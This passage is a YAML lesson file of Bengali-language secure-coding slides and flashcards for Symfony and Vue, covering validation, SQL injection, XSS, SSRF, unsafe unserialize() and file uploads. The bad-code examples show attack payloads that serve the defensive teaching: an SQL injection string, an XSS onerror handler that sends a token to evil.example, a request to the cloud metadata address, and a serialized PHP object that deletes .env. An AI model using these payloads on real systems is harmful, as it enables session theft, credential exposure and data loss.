slides:
  - slug: validate-at-the-door
    title: 'দরজায় যাচাই: যা ঢুকছে সবই অচেনা'
    kind: story
    tldr: 'ব্রাউজারের check শুধু ব্যবহারকারীর সুবিধার; আসল পাহারা সার্ভারে, allowlist ধরে — আর Symfony-তে সেটা DTO আর constraint দিয়ে সহজেই হয়।'
    keywords: ['input validation', 'MapRequestPayload', 'Symfony Validator', 'allowlist', 'ভ্যালিডেশন', 'DTO']
    blocks:
      - type: metaphor
        icon: ticket
        title: 'সিনেমা হলের গেটের টিকিট চেক'
        body: |
          হলের গেটে ছেঁড়া টিকিট দেখালেও লোকটাকে ঢুকতে দেওয়া হয় না: গেটম্যান টিকিটের তারিখ, শো আর সিট নিজে মিলিয়ে দেখে। বাইরে সাইনবোর্ডে "টিকিট ছাড়া প্রবেশ নিষেধ" লেখা থাকলেও সে সাইনবোর্ড ভরসা করে না। Vue-র ফর্মের check হলো সাইনবোর্ড; সার্ভারের Validator হলো গেটম্যান।
      - type: visual
        kind: compare
        caption: 'দুই জায়গার check, দুই রকম কাজ'
        columns:
          - title: 'ব্রাউজারে (Vue)'
            tone: warn
            icon: browser
            tip: 'ব্যবহারকারী দ্রুত ভুল জানতে পারে, কিন্তু আক্রমণকারী ব্রাউজার এড়িয়ে সরাসরি curl দিয়ে request পাঠাতে পারে।'
            items:
              - 'ভুল সাথে সাথে দেখায়, ব্যবহারকারীর সুবিধা'
              - 'কেউ বন্ধ করে দিতে বা এড়িয়ে যেতে পারে'
              - 'নিরাপত্তার ভরসা নয়'
          - title: 'সার্ভারে (Symfony)'
            tone: good
            icon: shield
            tip: 'শেষ পাহারা। এখানকার check এড়ানোর কোনো উপায় ক্লায়েন্টের হাতে নেই।'
            items:
              - 'প্রতিটা request-এ বাধ্যতামূলক'
              - 'allowlist: কী ঠিক তা বলুন, বাকি সব বাদ'
              - 'টাইপ, দৈর্ঘ্য, সীমা আর ফরম্যাট দেখুন'
      - type: text
        body: |
          যাচাই না থাকলে যে কেউ `curl -X POST /orders -d '{"quantity": -5}'` চালাতে পারে। মোট দাম দাঁড়ায় -৫ × দাম, আর দোকান উল্টে গ্রাহকের কাছে টাকা ধারে। নিচের DTO থাকলে একই request ৪২২ পায়, বার্তা "This value should be between 1 and 10"। অর্ডারের কোড সেটা দেখেই না।
      - type: code
        lang: php
        file: 'src/Dto/CreateOrderRequest.php + controller'
        variant: good
        code: |
          final class CreateOrderRequest
          {
              public function __construct(
                  #[Assert\NotBlank, Assert\Length(max: 100)]
                  public readonly string $customerName,
                  #[Assert\Range(min: 1, max: 10)]
                  public readonly int $quantity,
                  #[Assert\Choice(['pickup', 'delivery'])]
                  public readonly string $method,
              ) {
              }
          }

          #[Route('/orders', methods: ['POST'])]
          public function create(#[MapRequestPayload] CreateOrderRequest $dto): JsonResponse
          {
              // এখানে পৌঁছালে $dto ইতিমধ্যে যাচাই-করা
              return $this->json($this->orders->place($dto), 201);
          }
        marks:
          - {line: 7, tip: 'int টাইপ আর Range মিলে quantity -5 বা "abc" দুটোই আটকায়। বাইরে থেকে আসা মান type আর সীমা দুটোই মানতে হয়।'}
          - {line: 8, tip: 'Choice হলো allowlist: শুধু এই দুই মান চলবে, অন্য সব, এমনকি অচেনা নতুন মানও, বাতিল।'}
          - {line: 15, tip: 'Constraint ভাঙলে Symfony নিজেই ৪২২ উত্তর দেয় আর ভুলের তালিকা পাঠায়; controller-এ কিছু লিখতে হয় না।'}
      - type: quote
        body: 'ক্লায়েন্টের check সুবিধার জন্য; সার্ভারের check নিরাপত্তার জন্য।'
    aside:
      - type: problem
        body: 'অ্যাপের ভেতরে ঢোকা প্রতিটা মান আক্রমণের সম্ভাব্য পথ। যাচাই এক জায়গায় (DTO) রাখলে পরের সব কোড ধরে নিতে পারে যে মানগুলো ঠিক আকারের।'
      - type: tips
        items:
          - 'Blocklist ("এই শব্দগুলো বাদ") নয়, allowlist ("শুধু এগুলো চলবে") ব্যবহার করুন। আক্রমণকারী blocklist-এর বাইরের পথ খুঁজে নেয়।'
          - 'URL query-র জন্য #[MapQueryString], আর DTO-তে আলাদা request type রাখুন; Doctrine entity সরাসরি bind করবেন না (mass assignment)।'
      - type: terms
        items:
          - {term: 'Allowlist', meaning: 'যা অনুমোদিত তার তালিকা; তালিকার বাইরের সবকিছু বাতিল।'}
          - {term: 'DTO', meaning: 'শুধু request-এর ডেটা ধরার সাধারণ class, যার কোনো বিজনেস লজিক নেই।'}
    check:
      q: 'Vue ফর্মে সব check আছে, তবু সার্ভারে আবার Validator লাগে কেন?'
      a: 'কারণ আক্রমণকারী ব্রাউজার এড়িয়ে সরাসরি request পাঠাতে পারে। সার্ভারের check ছাড়া যেকোনো মান ঢুকে যায়।'

  - slug: sql-injection
    title: 'SQL injection: ইনপুট যখন হুকুম হয়ে যায়'
    kind: pitfall
    tldr: 'ইনপুট SQL string-এ জুড়লে সেটা ডেটা না থেকে নির্দেশ হয়ে যায়; parameterised query-তে মান আলাদা পথে যায়, তাই কখনো নির্দেশ হয় না।'
    keywords: ['SQL injection', 'parameterised query', 'prepared statement', 'Doctrine', 'QueryBuilder', 'SQL ইনজেকশন']
    blocks:
      - type: metaphor
        icon: pencil
        title: 'ফর্মের নামের ঘরে হুকুম'
        body: |
          অফিসের কর্মী ফর্মের "নাম" ঘরে লেখা কথা অক্ষরে অক্ষরে পড়ে। কেউ নামের ঘরে লিখল "রহিম। এবং ক্যাশবাক্স খুলে দিন", আর কর্মী পুরোটাকেই নির্দেশ ভাবল। Parameterised query-তে নির্দেশ আর নাম আলাদা কাগজে যায়; তাই নামের ঘরে যা-ই লেখা থাকুক, কর্মী সেটাকে শুধু নাম হিসেবেই পড়ে।
      - type: code
        lang: php
        file: 'src/Repository/UserRepository.php'
        variant: bad
        code: |
          // $email আসে ফর্ম থেকে: ' OR '1'='1
          $sql = "SELECT * FROM users WHERE email = '$email'";
          $rows = $this->connection->executeQuery($sql)->fetchAllAssociative();

          // ওপরের কোড আসলে এই SQL চালায়:
          // SELECT * FROM users WHERE email = '' OR '1'='1'
        marks:
          - {line: 2, tip: 'ইনপুট সরাসরি string-এ জোড়া হয়েছে। quote বন্ধ করে নিজের SQL ঢোকানো এখন সম্ভব।'}
          - {line: 6, tip: '"OR 1=1" সবসময় সত্য, তাই সব ইউজারের সারি ফিরে আসে। আরও খারাপ: UNION দিয়ে অন্য table পড়া যায়, যেমন পাসওয়ার্ডের hash।'}
      - type: code
        lang: php
        file: 'src/Repository/UserRepository.php'
        variant: good
        code: |
          public function findByEmail(string $email): ?User
          {
              return $this->createQueryBuilder('u')
                  ->where('u.email = :email')
                  ->setParameter('email', $email)
                  ->getQuery()
                  ->getOneOrNullResult();
          }

          // raw SQL দরকার হলেও একই নিয়ম: ? বা :name, মান আলাদা
          $this->connection->executeQuery(
              'SELECT id FROM users WHERE email = :email',
              ['email' => $email],
          );

          // ORDER BY-তে parameter চলে না: তার বদলে নির্দিষ্ট তালিকা থেকে বাছুন
          $column = ['price' => 'p.price', 'name' => 'p.name'][$sort] ?? 'p.price';
          $qb->orderBy($column);
        marks:
          - {line: 4, tip: ':email হলো ফাঁকা জায়গা; মান SQL-এর অংশ হয় না, ডেটাবেস driver আলাদাভাবে পাঠায়।'}
          - {line: 13, tip: 'Doctrine DBAL-এও ব্যবহারকারীর মান কখনো string-এ জোড়া হয় না।'}
          - {line: 17, tip: 'ব্যবহারকারীর শব্দ শুধু একটা key বাছে। SQL-এ যায় কেবল আমাদের নিজের column string; অচেনা কিছু এলে p.price।'}
      - type: quote
        body: 'SQL-এর ভেতরে ইনপুট নয়; SQL আলাদা, ইনপুট আলাদা parameter।'
    aside:
      - type: pitfalls
        items:
          - 'ORDER BY-র কলামের নাম বা table-এর নাম parameter হয় না। ব্যবহারকারীর বাছাইকে allowlist-এর সাথে মিলিয়ে নিন: ["price", "created_at"]।'
          - 'ORM ব্যবহার করলেই নিরাপদ নয়: createQuery("... $input ...") লিখলে একই ফাঁদ।'
          - 'escape বা addslashes ভরসা নয়; parameter-ই একমাত্র সঠিক উপায়।'
      - type: tips
        items:
          - 'অ্যাপের DB ইউজারকে DROP বা অন্য database-এর অধিকার দেবেন না, ফাঁদ পড়লেও ক্ষতি ছোট থাকে।'
      - type: refs
        items:
          - {to: 'security/secrets-management', label: 'Least privilege: DB ইউজারের ক্ষমতা'}
    check:
      q: 'ব্যবহারকারী sort=price বা sort=name বেছে নিতে পারে। এই মান ORDER BY-তে কীভাবে বসাবেন?'
      a: 'Allowlist-এর সাথে মিলিয়ে: শুধু অনুমোদিত কলামের নাম বসান, অন্য মান এলে ডিফল্ট ধরুন। ORDER BY-র নাম parameter করা যায় না।'

  - slug: xss
    title: 'XSS: নোটিশ বোর্ডে অন্যের লেখা কোড'
    kind: pitfall
    tldr: 'ব্যবহারকারীর লেখা HTML পাতায় যেমন আছে তেমন বসালে সেটা অন্যের ব্রাউজারে JavaScript হয়ে চলে; escape করা বা sanitize করাই প্রতিকার।'
    keywords: ['XSS', 'cross-site scripting', 'v-html', 'Twig escape', 'HtmlSanitizer', 'CSP', 'এক্সএসএস']
    blocks:
      - type: metaphor
        icon: megaphone
        title: 'পাড়ার নোটিশ বোর্ড'
        body: |
          পাড়ার নোটিশ বোর্ডে যে কেউ কাগজ সাঁটাতে পারে। একজন লিখল "সবাই নিজের বিকাশ পিন অমুক নম্বরে জানান", আর লোকে বোর্ডের লেখা বলেই বিশ্বাস করে। XSS-ও তা-ই: আক্রমণকারীর লেখা কমেন্ট অন্য ব্যবহারকারীর পাতায় বসে তাদের ব্রাউজারে চলে, আর ব্রাউজার ভাবে লেখাটা সাইটেরই।
      - type: code
        lang: vue
        file: 'CommentItem.vue'
        variant: bad
        code: |
          <script setup lang="ts">
          defineProps<{ comment: { author: string; body: string } }>()
          </script>

          <template>
            <!-- body = <img src=x onerror="fetch('https://evil.example/?t=' + localStorage.token)"> -->
            <h4>{{ comment.author }}</h4>
            <div v-html="comment.body"></div>
          </template>
        marks:
          - {line: 7, tip: 'Vue-র {{ }} আর Twig-এর {{ }} দুটোই ডিফল্টে escape করে: < হয়ে যায় &lt;, তাই ট্যাগ চলে না। লেখকের নাম নিরাপদ।'}
          - {line: 8, tip: 'v-html আর Twig-এর |raw escape বন্ধ করে। ছবি লোড হয় না, onerror চলে, আর প্রতিটা দর্শকের token evil.example-এ চলে যায়।'}
      - type: code
        lang: vue
        file: 'CommentItem.vue'
        variant: good
        code: |
          <script setup lang="ts">
          import DOMPurify from 'dompurify'
          import { computed } from 'vue'

          const props = defineProps<{ comment: { author: string; body: string } }>()
          // b, i, a, ul-এর মতো নিরাপদ ট্যাগ থাকে; script, onerror, javascript: লিংক কাটা পড়ে
          const safeBody = computed(() => DOMPurify.sanitize(props.comment.body))
          </script>

          <template>
            <h4>{{ comment.author }}</h4>
            <!-- সাধারণ লেখার কমেন্টে শুধু {{ comment.body }}, v-html-ই লাগে না -->
            <div v-html="safeBody"></div>
          </template>
        marks:
          - {line: 7, tip: 'একই বিষাক্ত body ঢোকে; onerror attribute বেরিয়ে যায়, পড়ে থাকে নিরীহ একটা image ট্যাগ। bold আর লিংক টিকে থাকে।'}
          - {line: 13, tip: 'v-html এখন শুধু পরিষ্কার করা লেখা পায়। সাধারণ লেখা হলে v-html বাদ দিয়ে {{ }}-এ escape হতে দিন।'}
      - type: visual
        kind: compare
        caption: 'HTML কোথায় পরিষ্কার করবেন: দুটোই চলে, একটা বেশি ঢাকে'
        columns:
          - title: 'ব্রাউজারে পরিষ্কার'
            tone: warn
            icon: browser
            tip: 'যোগ করা সহজ, কিন্তু কাঁচা HTML তখনো জমা থাকে আর অন্য সব client-এ যায়।'
            items:
              - 'v-html-এর আগে DOMPurify, ওপরের কোডের মতো'
              - 'শুধু এই Vue অ্যাপকে বাঁচায়: মোবাইল অ্যাপ বা ইমেইলে কাঁচা HTML যায়'
              - 'দ্বিতীয় স্তর হিসেবে ভালো, একমাত্র স্তর নয়'
          - title: 'সার্ভারে পরিষ্কার'
            tone: good
            icon: shield
            tip: 'নোংরা HTML ডেটাবেসেই ঢোকে না, তাই সব client একসাথে নিরাপদ।'
            items:
              - 'সেভের সময় HtmlSanitizer: একবার পরিষ্কার, সব client উপকৃত'
              - 'framework.html_sanitizer-এর নিচে app.comment_sanitizer বানান'
              - 'দাম: কয়েক লাইন config আর প্রতি সেভে একটা sanitize() কল'
      - type: quote
        body: 'ব্যবহারকারীর লেখা হয় escape করে দেখান, নয়তো sanitize করে; কখনো যেমন আছে তেমন বসাবেন না।'
    aside:
      - type: tips
        items:
          - 'সার্ভারে HtmlSanitizerInterface $appCommentSanitizer inject করুন (html_sanitizer.yaml-এ allow_safe_elements: true) আর সেভের আগে sanitize() ডাকুন।'
          - 'দ্বিতীয় প্রাচীর হিসেবে Content-Security-Policy header দিন: ইনলাইন script বন্ধ করলে XSS-এর ক্ষতি সীমিত থাকে।'
          - 'Token localStorage-এ রাখলে XSS-এ চুরি যায়; সেজন্য session cookie-তে HttpOnly দিন।'
      - type: terms
        items:
          - {term: 'Escape', meaning: '< > & " এর মতো বিশেষ চিহ্নকে নিরীহ লেখায় বদলানো, যাতে ব্রাউজার তাকে ট্যাগ না ভাবে।'}
          - {term: 'CSP', meaning: 'কোন source থেকে script চলতে পারবে, তা ব্রাউজারকে বলে দেওয়া header।'}
          - {term: 'Sanitize', meaning: 'HTML ছেঁটে নিরাপদ ট্যাগ আর attribute-এর তালিকায় আনা, বাকি সব ফেলে দেওয়া।'}
      - type: refs
        items:
          - {to: 'security/sessions-tokens', label: 'Token কোথায় রাখবেন'}
    check:
      q: 'কমেন্টে সামান্য bold আর link দেখাতে হবে। v-html দিলে কেন বিপদ, আর বিকল্প কী?'
      a: 'v-html সব ট্যাগ চালায়, <script> বা onerror-ও। বিকল্প: sanitize করা (সার্ভারে HtmlSanitizer দিয়ে, বা ব্রাউজারে DOMPurify দিয়ে), শুধু নিরাপদ ট্যাগ রেখে তারপর দেখানো।'

  - slug: ssrf
    title: 'SSRF: সার্ভারকে দিয়ে ভেতরের দরজা খোলানো'
    kind: pitfall
    tldr: 'ব্যবহারকারী যে URL দেয়, সার্ভার তা আনতে গেলে সে ভেতরের নেটওয়ার্ক বা ক্লাউড metadata-ও আনতে পারে; হোস্ট allowlist আর private IP বন্ধ করাই উপায়।'
    keywords: ['SSRF', 'server side request forgery', 'NoPrivateNetworkHttpClient', 'metadata endpoint', 'allowlist host']
    blocks:
      - type: metaphor
        icon: truck
        title: 'কুরিয়ার ছেলে আর ম্যানেজারের ঘর'
        body: |
          কুরিয়ার ছেলেকে বলা হলো "এই ঠিকানা থেকে প্যাকেট নিয়ে এসো"। বাইরের লোক ঠিকানা দিল, আসলে ঠিকানাটা ম্যানেজারের নিজের সিন্দুকঘর, যেখানে শুধু অফিসের লোকই ঢুকতে পারে। ছেলেটা অফিসের লোক বলে ভেতরে ঢুকে প্যাকেট (চাবি) এনে দিল। সার্ভারও ভেতরের নেটওয়ার্কে ঢুকতে পারে, তাই বাইরের লোকের দেওয়া URL-এ সে যেতে পারে না।
      - type: visual
        kind: flow
        caption: 'Avatar URL হিসেবে ভেতরের ঠিকানা দিলে কী ঘটে'
        nodes:
          - {id: attacker, label: 'আক্রমণকারী', sub: 'বাইরের লোক', icon: user, tone: bad, col: 0, row: 1, tip: 'নিজে ভেতরে ঢুকতে পারে না, তাই সার্ভারকে দিয়ে ঢোকাতে চায়।'}
          - {id: api, label: 'Symfony API', sub: 'avatar import', icon: api, tone: accent, col: 1.5, row: 1, tip: 'ব্যবহারকারীর দেওয়া URL-এ GET করে ছবি আনে। যাচাই না করলে যেকোনো ঠিকানায় যায়।'}
          - {id: meta, label: 'Cloud metadata', sub: '169.254.169.254', icon: cloud, tone: warn, col: 3, row: 1, tip: 'ক্লাউড সার্ভারের ভেতরের ঠিকানা, যা সার্ভারের অস্থায়ী access key দেয়। বাইরে থেকে পৌঁছানো যায় না।'}
        edges:
          - {from: attacker, to: api, label: 'avatar URL হিসেবে http://169.254.169.254/... দেয়', tone: bad}
          - {from: api, to: meta, label: 'সার্ভার নিজেই ভেতরের ওই ঠিকানায় গিয়ে GET করে', tone: bad}
          - {from: meta, to: api, label: 'ক্লাউডের access key সার্ভারের হাতে আসে', dashed: true, tone: bad}
          - {from: api, to: attacker, label: 'সার্ভার সেই উত্তরটাই আক্রমণকারীকে ফেরত দেয়', dashed: true, tone: bad}
      - type: code
        lang: php
        file: 'src/Avatar/AvatarImporter.php'
        variant: good
        code: |
          final class AvatarImporter
          {
              private const ALLOWED_HOSTS = ['images.example.com', 'cdn.example.com'];
              private HttpClientInterface $client;

              public function __construct(HttpClientInterface $client)
              {
                  // private/loopback/link-local IP-তে যাওয়া আটকায়
                  $this->client = new NoPrivateNetworkHttpClient($client);
              }

              public function fetch(string $url): string
              {
                  $p = parse_url($url);
                  if (($p['scheme'] ?? '') !== 'https'
                      || !in_array($p['host'] ?? '', self::ALLOWED_HOSTS, true)) {
                      throw new \InvalidArgumentException('Host allowed নয়');
                  }

                  return $this->client->request('GET', $url, [
                      'max_redirects' => 0,
                      'timeout' => 3,
                  ])->getContent();
              }
          }
        marks:
          - {line: 9, tip: 'NoPrivateNetworkHttpClient DNS-এর উত্তরের IP দেখে private ঠিকানা আটকায়, তাই "evil.com → 127.0.0.1" চালও ধরা পড়ে।'}
          - {line: 16, tip: 'শুধু https আর allowlist-এর host। তালিকার বাইরের host-এ কখনো request নয়।'}
          - {line: 21, tip: 'Redirect বন্ধ: নইলে অনুমোদিত host আক্রমণকারীর পছন্দের ভেতরের ঠিকানায় পাঠিয়ে দিতে পারে।'}
      - type: quote
        body: 'ব্যবহারকারীর দেওয়া URL-এ সার্ভার যাবে শুধু allowlist-এর ভেতরে।'
    aside:
      - type: tips
        items:
          - 'URL দেওয়ার ফিচারগুলো চিনে রাখুন: ছবি import, webhook URL, link preview, PDF রেন্ডার। এখানেই SSRF লুকিয়ে থাকে।'
          - 'ক্লাউডে IMDSv2 (token-ভিত্তিক metadata) চালু রাখুন; তাহলে সরল GET দিয়ে key পাওয়া যায় না।'
          - 'সার্ভারের নেটওয়ার্ক নিয়ম (egress firewall) দিয়ে অ্যাপকে ভেতরের ঠিকানায় যেতেই না দেওয়া সবচেয়ে মজবুত দেয়াল।'
          - 'allowlist-এর দাম: ব্যবহারকারী শুধু আপনার অনুমোদিত host থেকে import করতে পারবে। যেকোনো URL নিতেই হলে আলাদা, বিচ্ছিন্ন worker দিয়ে আনুন, যার ভেতরের নেটওয়ার্কে পথই নেই।'
      - type: terms
        items:
          - {term: 'SSRF', meaning: 'Server-Side Request Forgery: সার্ভারকে ঠকিয়ে নিজের পক্ষ থেকে request পাঠানো।'}
          - {term: 'Egress firewall', meaning: 'সার্ভার নিজে কোথায় বাইরে যোগাযোগ করতে পারবে, তার নেটওয়ার্ক নিয়ম।'}
    check:
      q: 'ব্যবহারকারী URL দিয়েছে evil.com, যার DNS উত্তর দেয় 127.0.0.1। শুধু hostname পরীক্ষা করলে কেন ফাঁদ থেকে যায়?'
      a: 'Hostname allowlist-এ না থাকলে বাতিল হয় ঠিকই, কিন্তু অনুমোদিত নামও ভেতরের IP-তে মুখ করতে পারে। তাই resolved IP-ও দেখতে হয়, যা NoPrivateNetworkHttpClient করে।'

  - slug: unsafe-deserialization
    title: 'unserialize(): বাক্স খুলতেই খেলনা চালু'
    kind: pitfall
    tldr: 'অবিশ্বস্ত ডেটায় unserialize() চালালে আক্রমণকারী যেকোনো class-এর object বানাতে পারে, যা খোলার সাথে সাথে কোড চালায়; JSON আর DTO-ই নিরাপদ পথ।'
    keywords: ['unserialize', 'object injection', 'deserialization', 'gadget chain', 'Symfony Serializer', 'json_decode']
    blocks:
      - type: metaphor
        icon: box
        title: 'জীবন্ত খেলনার বাক্স'
        body: |
          অচেনা কেউ একটা বাক্স দিল, আর বলল "খুলে দেখুন, ভেতরের জিনিস যেমন আছে তেমনই বসিয়ে দিন"। বাক্সে ছিল এমন এক খেলনা, যা খোলামাত্র নিজে চালু হয়ে আপনার বাড়ির জিনিস ভাঙতে শুরু করল। `unserialize()` সেই বাক্স খোলে; আর JSON হলো শুধু লেখা তালিকা, যা খুললেও কিছু চালু হয় না।
      - type: code
        lang: php
        file: 'src/Controller/CartController.php'
        variant: bad
        code: |
          // অ্যাপে (বা তার কোনো library-তে) কোথাও:
          final class TempFile
          {
              public string $path;
              public function __destruct() { unlink($this->path); }   // ছাড়া পেলে গুছিয়ে দেয়
          }

          // কুকিতে cart থাকে PHP serialize করা
          $cart = unserialize(base64_decode($request->cookies->get('cart')));
          // আক্রমণকারীর কুকি: O:8:"TempFile":1:{s:4:"path";s:13:"/var/www/.env";}
          // PHP একটা TempFile বানায়; ছাড়া পেতেই __destruct() .env ফাইল মুছে দেয়
        marks:
          - {line: 5, tip: 'নিরীহ একটা method, যতক্ষণ না আক্রমণকারী path বেছে দিতে পারে। আসল আক্রমণে অ্যাপ বা library-র class-এর এমন method শিকল বানানো হয়।'}
          - {line: 9, tip: 'কুকি ক্লায়েন্টের হাতে। সে নিজের বানানো serialized object পাঠালে PHP সেই class-এর __destruct বা __wakeup চালিয়ে দেয়।'}
      - type: code
        lang: php
        file: 'src/Controller/CartController.php'
        variant: good
        code: |
          #[Route('/cart', methods: ['POST'])]
          public function update(#[MapRequestPayload] CartRequest $cart): JsonResponse
          {
              // JSON → শুধু CartRequest class, আর constraint দিয়ে যাচাই-করা
              return $this->json($this->carts->save($cart));
          }

          // যদি বাধ্য হয়ে unserialize করতেই হয়:
          $data = unserialize($payload, ['allowed_classes' => false]);
        marks:
          - {line: 2, tip: 'Symfony Serializer শুধু ঘোষিত class-এর ঘরগুলোতে মান বসায়। কোনো কোড চলে না।'}
          - {line: 9, tip: 'allowed_classes: false দিলে object বানানোই বন্ধ। তবুও নতুন কোডে এড়িয়ে চলাই ভালো।'}
      - type: quote
        body: 'অবিশ্বস্ত ডেটায় কখনো unserialize() নয়; ডেটার ফরম্যাট JSON, আর লক্ষ্য একটা নির্দিষ্ট DTO।'
    aside:
      - type: pitfalls
        items:
          - 'Cache, session, queue বা cookie-র মান ব্যবহারকারীর হাতে বদলানো গেলে সেখানেও একই বিপদ। যা ক্লায়েন্টের হাত ঘুরে এসেছে তাকে অবিশ্বস্ত ধরুন।'
          - 'JSON নিজে নিরাপদ হলেও পরে সেটা দিয়ে class নাম বা method নাম বানিয়ে ডাকা (new $data[''class'']) আবার একই ফাঁদ।'
      - type: tips
        items:
          - 'ক্লায়েন্টকে কোনো অবস্থা ফেরত পাঠাতে হলে সই করে পাঠান (HMAC), আর ফেরত এলে সই যাচাই করুন; তবু গুরুত্বপূর্ণ তথ্য সার্ভারেই রাখুন।'
    check:
      q: 'কুকিতে ব্যবহারকারীর cart serialize করে রাখা হচ্ছে। কেন এটা ঝুঁকিপূর্ণ, আর বদলে কী করবেন?'
      a: 'কুকি ক্লায়েন্টের হাতে, সে বানানো object পাঠিয়ে কোড চালাতে পারে। cart সার্ভারে (session বা DB) রাখুন, নয়তো JSON আর DTO দিয়ে পড়ুন।'

  - slug: safe-file-uploads
    title: 'ফাইল আপলোড: প্যাকেটের ভেতরটা দেখুন, লেবেল নয়'
    kind: howto
    tldr: 'আপলোডে ফাইলের নাম, extension আর ক্লায়েন্টের দেওয়া type বিশ্বাস করা যায় না; সাইজ আর আসল ধরন যাচাই করুন, নতুন নাম দিন, web root-এর বাইরে রাখুন।'
    keywords: ['file upload', 'MapUploadedFile', 'MIME type', 'web shell', 'Assert File', 'ফাইল আপলোড']
    blocks:
      - type: metaphor
        icon: archive
        title: 'ডাকঘরে পার্সেল গ্রহণ'
        body: |
          ডাকঘর পার্সেলের গায়ের লেবেল বিশ্বাস করে না; ওজন মাপে, ভেতরে কী আছে দেখে। তারপর নিজের নম্বর লাগায়, আর গুদামে রাখে, যেখানে ক্রেতা ঢুকতে পারে না। আপলোডেও তা-ই: ক্লায়েন্টের দেওয়া নাম আর type লেবেল মাত্র।
      - type: text
        body: |
          এই নিয়মগুলো ছাড়া আক্রমণকারী `shell.php` আপলোড করে তাকে `image/jpeg` লেবেল দেয়। পুরনো কোড সেটা রাখে `public/uploads/shell.php`-তে। সেই URL খুললে আক্রমণকারীর PHP আপনার সার্ভারে চলে, মানে সার্ভার এখন তার। নিচের কোডে আসল JPEG বা PNG না হলে ফাইল ৪২২ পেয়ে ফেরত যায়, আর আসল ফাইলও পায় random নাম, এমন ফোল্ডারে যা ওয়েব সার্ভার কখনো দেখায় না।
      - type: points
        title: 'আপলোডের পাঁচ নিয়ম'
        style: check
        items:
          - 'সাইজের সীমা দিন; নইলে বিশাল ফাইলে ডিস্ক আর মেমোরি ভরে সাইট বসে যায় (DoS)।'
          - 'ধরন allowlist করুন (jpg, png, pdf), আর দেখুন ফাইলের ভেতরের আসল content-type।'
          - 'ক্লায়েন্টের নাম ফেলে দিয়ে নিজে random নাম বানান; "../../x.php" জাতীয় পথ-চালাকি আটকায়।'
          - 'Web root-এর বাইরে বা আলাদা storage (S3-জাতীয়)-এ রাখুন; সেখানে কোড চলতে দেবেন না।'
          - 'ছবি হলে নতুন করে encode করে নিন, ভেতরে লুকানো কিছু থাকলে বাদ যাবে।'
      - type: code
        lang: php
        file: 'src/Controller/AvatarController.php'
        variant: good
        code: |
          #[Route('/me/avatar', methods: ['POST'])]
          public function upload(
              #[MapUploadedFile([
                  new Assert\File(maxSize: '2M'),
                  new Assert\Image(mimeTypes: ['image/jpeg', 'image/png']),
              ])]
              UploadedFile $photo,
              #[Autowire('%kernel.project_dir%/var/uploads')] string $dir,
          ): JsonResponse {
              // নাম আমাদের, ক্লায়েন্টের নয়; extension content থেকে অনুমান
              $name = Uuid::v7()->toRfc4122().'.'.$photo->guessExtension();
              $photo->move($dir, $name);

              return $this->json(['file' => $name], 201);
          }
        marks:
          - {line: 5, tip: 'Symfony Validator ফাইলের আসল ধরন (finfo দিয়ে content থেকে) দেখে। ক্লায়েন্টের পাঠানো type-এ ভরসা নয়।'}
          - {line: 8, tip: 'var/uploads public/-এর বাইরে। URL দিয়ে সরাসরি পাওয়া যায় না, আর সার্ভার সেখানে PHP চালায় না।'}
          - {line: 11, tip: 'UUID নাম: নাম থেকে কিছু অনুমান করা বা পুরনো ফাইল ওভাররাইট করা যায় না।'}
      - type: quote
        body: 'আপলোড করা ফাইল মানে অচেনা মানুষের হাতে বানানো জিনিস; নিজের নাম, নিজের জায়গা, নিজের যাচাই।'
    aside:
      - type: pitfalls
        items:
          - '"শুধু extension দেখি": shell.php.jpg বা বদলানো header সহজেই পার পায়। content দেখুন।'
          - 'public/uploads/-এ রেখে PHP চালানোর অনুমতি রাখা: আপলোড করা shell.php সরাসরি ওয়েব শেল হয়ে যায়।'
          - 'SVG-তে script থাকতে পারে (XSS); ব্যবহারকারীর SVG দেখাতে গেলে sanitize করুন বা এড়িয়ে চলুন।'
      - type: terms
        items:
          - {term: 'Web root', meaning: 'যে ফোল্ডার ওয়েব সার্ভার ইন্টারনেটের যে কাউকে URL ধরে দেখায়।'}
          - {term: 'Web shell', meaning: 'আপলোড করা এমন script, যা ব্রাউজার দিয়ে আক্রমণকারীকে আপনার সার্ভারে কমান্ড চালানোর সুযোগ দেয়।'}
      - type: tips
        items:
          - 'ফাইল ফেরত দেওয়ার সময় Content-Type নিজে বসান আর X-Content-Type-Options: nosniff header দিন।'
      - type: refs
        items:
          - {to: 'data/files-blobs', label: 'ফাইল ও blob কোথায় রাখবেন'}
    check:
      q: 'আপলোড করা ফাইলের নাম রাখা হলো ক্লায়েন্টের পাঠানো নামেই। এতে কোন দুটো সমস্যা হতে পারে?'
      a: 'পথ-চালাকি (../) করে অন্য জায়গায় লেখা বা পুরনো ফাইল ওভাররাইট, আর shell.php-এর মতো নাম দিয়ে কোড চালানো। তাই নিজের random নাম দিন।'

flashcards:
  - q: 'কেন ব্রাউজারে validation থাকলেও সার্ভারে লাগে?'
    a: 'কারণ আক্রমণকারী ব্রাউজার এড়িয়ে সরাসরি request পাঠাতে পারে। ক্লায়েন্টের check সুবিধার, সার্ভারেরটা নিরাপত্তার।'
    more: |
      curl বা Postman দিয়ে যে কেউ সরাসরি API-তে যেকোনো মান পাঠাতে পারে। Vue-র ফর্ম ভুল দ্রুত দেখায়, কিন্তু তাকে ঠেকানো যায় না। সার্ভারে DTO আর constraint বসালে প্রতিটা request একই নিয়মে যাচাই হয়।
    ref: validate-at-the-door
  - q: 'অর্ডারের endpoint-এ quantity যাচাই না করলে কী হতে পারে?'
    a: 'কেউ curl দিয়ে quantity -৫ পাঠায়, মোট দাম ঋণাত্মক হয়ে দোকানই টাকা ধারে। Range(min: 1, max: 10) তাকে ৪২২ দিয়ে ফেরায়।'
    more: |
      মানকে type (int, "abc" নয়) আর সীমা দুটোই পার হতে হয়। constraint-সহ DTO অর্ডারের কোড চলার আগেই দুটো দেখে নেয়, তাই বাকি কোড নিশ্চিন্তে ধরে নিতে পারে যে যা পেয়েছে তা ঠিক।
    ref: validate-at-the-door
  - q: 'Allowlist আর blocklist-এর পার্থক্য কী, কোনটা ভালো?'
    a: 'Allowlist বলে কী চলবে, বাকি সব বাতিল। Blocklist বলে কী চলবে না, বাকি সব চলে। Allowlist নিরাপদ।'
    more: |
      Blocklist-এ আক্রমণকারী আপনার না-ভাবা কোনো রূপ খুঁজে বার করে। Allowlist-এ অচেনা সবকিছুই আপনা-আপনি বাদ। Symfony-তে `Assert\Choice`, `Assert\Range`, আর host allowlist এই ধারণারই উদাহরণ।
    ref: validate-at-the-door
  - q: 'SQL injection ঠেকানোর সঠিক উপায় কী?'
    a: 'Parameterised query: SQL আলাদা, মান আলাদা parameter। কখনো ইনপুট string-এ জুড়বেন না।'
    more: |
